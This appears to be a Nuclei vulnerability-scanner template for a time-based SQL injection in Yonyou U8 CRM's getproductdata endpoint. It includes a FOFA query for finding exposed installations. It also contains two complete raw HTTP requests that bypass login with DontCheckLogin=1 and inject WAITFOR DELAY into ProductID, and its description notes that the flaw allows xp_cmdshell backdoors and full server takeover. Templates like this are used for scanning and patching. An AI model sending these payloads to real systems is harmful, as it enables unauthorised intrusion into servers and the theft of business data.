id: yongyouU8-CRM-getproductdata-sql

info:
  tags: yongyouU8-CRM-getproductdata-sql,sql,injection
  name: 用友U8 CRM getproductdata.php SQL延时注入漏洞
  author: xc
  severity: high
  description: |-
    fofa: body="用友U8CRM"
    用友 U8 CRM客户关系管理系统 getproductdata.php 文件存在SQL注入漏洞，未经身份验证的攻击者通过漏洞执行任意SQL语句，调用xpcmdshell写入后门文件，执行任意代码，从而获取到服务器权限。


http:
  - raw:
      - |
        POST /ajax/getsrvtemplate.php/getproductdata?type=1&DontCheckLogin=1 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0)
        Accept-Encoding: gzip, deflate
        Accept: */*
        Connection: close
        Content-Type: application/x-www-form-urlencoded
        Cookie: PHPSESSID=bgsesstimeout-; TL_EXPANDED=REL_STAGE2012
        Content-Length: 59

        ProductID=1112';WAITFOR+DELAY+'0:0:2'--+-&Action=fromsrvtpl
      - |
        POST /ajax/getsrvtemplate.php/getproductdata?type=1&DontCheckLogin=1 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0)
        Accept-Encoding: gzip, deflate
        Accept: */*
        Connection: close
        Content-Type: application/x-www-form-urlencoded
        Cookie: PHPSESSID=bgsesstimeout-; TL_EXPANDED=REL_STAGE2012
        Content-Length: 59

        ProductID=1112';WAITFOR+DELAY+'0:0:8'--+-&Action=fromsrvtpl

    matchers:
      - type: dsl
        dsl:
          - 'duration_1>=2 && duration_1<=3'  
          - 'duration_2>=8 && duration_2<=9'
        condition: and